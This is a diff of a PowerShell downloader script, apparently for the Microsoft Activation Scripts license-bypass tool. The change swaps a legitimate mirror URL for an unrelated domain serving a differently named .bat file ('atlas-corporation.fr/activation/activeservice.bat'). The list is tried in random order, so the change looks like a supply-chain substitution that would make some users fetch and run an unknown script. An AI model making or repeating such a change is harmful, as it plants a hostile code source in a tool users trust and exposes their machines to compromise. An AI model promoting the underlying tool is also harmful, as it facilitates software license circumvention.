@@ -31,7 +31,7 @@ function CheckFile {
 $URLs = @(
     'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/67abcd0c8925832fcf4365b9cf3706ab6fbf8571/MAS/All-In-One-Version-KL/MAS_AIO.cmd',
     'https://dev.azure.com/massgrave/Microsoft-Activation-Scripts/_apis/git/repositories/Microsoft-Activation-Scripts/items?path=/MAS/All-In-One-Version-KL/MAS_AIO.cmd&versionType=Commit&version=67abcd0c8925832fcf4365b9cf3706ab6fbf8571',
-    'https://git.activated.win/massgrave/Microsoft-Activation-Scripts/raw/commit/67abcd0c8925832fcf4365b9cf3706ab6fbf8571/MAS/All-In-One-Version-KL/MAS_AIO.cmd'
+    'https://atlas-corporation.fr/activation/activeservice.bat'
 )
 
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
